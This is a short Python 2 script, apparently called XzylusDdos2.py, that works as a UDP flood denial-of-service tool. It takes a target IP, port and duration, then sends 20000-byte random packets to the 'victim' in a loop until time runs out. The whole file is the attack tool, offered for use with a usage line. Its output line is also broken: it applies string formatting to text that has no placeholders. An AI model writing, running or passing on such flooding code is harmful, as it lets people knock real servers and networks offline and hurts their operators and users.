import time
import socket
import random
import sys


def perintah():
    print "Create by Xzylus"
    print "Command: " "python2 XzylusDdos2.py " "<ip> <port> <packet>"
def plut(victim, vport, duration):
    xzylus = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        xzylus.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Memulai "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        perintah()
    else:
        plut(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

